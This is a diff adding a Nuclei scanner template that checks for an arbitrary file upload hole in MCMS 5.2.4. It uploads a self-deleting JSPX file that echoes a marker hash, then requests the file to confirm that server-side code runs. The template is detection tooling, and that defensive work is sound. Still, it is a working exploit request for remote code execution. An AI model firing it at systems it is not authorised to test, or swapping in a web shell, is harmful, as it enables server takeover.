@@ -1,0 +1,60 @@
+id: mcms-5-2-4-file-upload
+info:
+  name: MCMS 5.2.4 Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    MCMS 5.2.4 version /file/upload.do has an arbitrary file upload vulnerability. Attackers can upload malicious files to control server permissions.
+  tags: file-upload
+  reference:
+    - https://gitee.com/mingSoft/MCMS
+    - https://forum.butian.net/share/998
+http:
+  - raw:
+      - |
+        POST /file/upload.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoau6pFB6mwCFZ9IM
+
+        ------WebKitFormBoundaryoau6pFB6mwCFZ9IM
+        Content-Disposition: form-data; name="file"; filename="213.jspx"
+        Content-Type: application/octet-stream
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <jsp:root xmlns="http://www.w3.org/1999/xhtml" version="2.0" xmlns:jsp="http://java.sun.com/JSP/Page" xmlns:c="http://java.sun.com/jsp/jstl/core">
+        <jsp:directive.page contentType="text/html;charset=UTF-8" language="java" />
+        <jsp:scriptlet>
+        out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
+        new java.io.File(application.getRealPath(request.getServletPath())).delete();
+        </jsp:scriptlet>
+        </jsp:root>
+        ------WebKitFormBoundaryoau6pFB6mwCFZ9IM--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"result":true'
+    extractors:
+      - type: regex
+        name: filepath
+        part: body
+        internal: true
+        regex:
+          - '"data":"(.*?)"'
+  - raw:
+      - |
+        GET {{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
